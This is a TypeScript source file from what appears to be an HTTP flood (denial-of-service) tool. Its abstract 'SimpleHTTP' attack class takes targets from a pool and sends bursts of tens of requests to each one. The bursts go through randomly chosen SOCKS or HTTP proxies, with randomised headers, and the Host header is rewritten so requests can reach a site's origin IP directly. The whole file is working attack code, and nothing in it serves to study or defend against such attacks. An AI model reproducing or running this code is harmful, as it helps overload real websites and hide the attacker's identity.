import axios, { AxiosRequestConfig, AxiosProxyConfig, Method, AxiosInstance, AxiosRequestHeaders } from 'axios'
import { SocksProxyAgent } from 'socks-proxy-agent'

import { GetTarget } from '../external/targetsPool'
import { ProxyPool, Proxy } from '../external/proxyPool'
import { Algorithm, Config, ExecutionResult } from './algorithm'

import { HttpHeadersUtils } from './utils/httpHeadersUtils'
import { sleep } from '../helpers'

export abstract class SimpleHTTP extends Algorithm {
  protected proxyPool: ProxyPool
  private attackClient: AxiosInstance

  abstract get method(): Method

  constructor (config: Config, proxyPool: ProxyPool) {
    super(config)
    this.proxyPool = proxyPool
    this.attackClient = axios.create({
      timeout: this.config.timeout,
      validateStatus: () => true,
      responseType: 'arraybuffer'
    })

    this.attackClient.interceptors.request.use((config) => {
      const newConfig = config as AxiosRequestConfig & {ip?: string; url: string; headers: AxiosRequestHeaders}
      if (typeof newConfig.ip === 'string') {
        const url = new URL(newConfig.url)
        newConfig.headers.Host = url.hostname
        url.hostname = newConfig.ip
        config.url = url.toString()
      }
      return newConfig as AxiosRequestConfig
    })
  }

  isValid (target: GetTarget): boolean {
    if (typeof target.page !== 'string' || !target.page.startsWith('http')) {
      return false
    }
    return true
  }

  async execute (target: GetTarget): Promise<ExecutionResult> {
    // Setting up proxy config
    let packetsSend = 0, packetsSuccess = 0

    let proxyConfig = {}
    let repeats = 16 + Math.floor(Math.random() * 32)

    if (!this.config.useRealIP) {
      const proxy = this.proxyPool.getRandomProxy()
      if (proxy === null) {
        console.warn('Proxy request failed because proxy wasnt found.')
        await sleep(100)
        return { packetsSend, packetsSuccess, target }
      }
      proxyConfig = this.generateProxyAxiosConfig(proxy)
      repeats += Math.floor(Math.random() * 32)
    }

    let success = true
    while (success && repeats > 0) {
      success = await this.makeRequest(target, proxyConfig)
      packetsSend += 1
      repeats -= 1
      if (success) {
        packetsSuccess++
      }
    }

    return { packetsSend, packetsSuccess, target }
  }

  protected async makeRequest (target: GetTarget, config: AxiosRequestConfig) {
    const { ip, page: url } = target
    try {
      const response = await this.attackClient.request({
        ...config,
        url,
        ip,
        headers: HttpHeadersUtils.generateRequestHeaders()
      } as AxiosRequestConfig)
      console.log(`${new Date().toISOString()} | ${url} | ${response.status}`)
      return true
    } catch (e) {
      console.log(`${new Date().toISOString()} | ${url} | DOWN OR BLOCKED`)
      return false
    }
  }

  protected generateProxyAxiosConfig (proxy: Proxy) {
    const axiosConfig = { } as AxiosRequestConfig
    if (proxy.scheme === 'socks4' || proxy.scheme === 'socks5') {
      const agent = new SocksProxyAgent({
        host: proxy.host,
        hostname: proxy.host,
        port: proxy.port,
        username: proxy.username,
        password: proxy.password
      }, {
        timeout: 10000
      })

      axiosConfig.httpAgent = agent
      axiosConfig.httpsAgent = agent
    } else {
      const proxyConfig = {
        host: proxy.host,
        port: proxy.port,
        protocol: proxy.scheme
      } as AxiosProxyConfig
      if (proxy.username !== undefined && proxy.password !== undefined) {
        proxyConfig.auth = {
          username: proxy.username,
          password: proxy.password
        }
      }
      axiosConfig.proxy = proxyConfig
    }

    return axiosConfig
  }
}
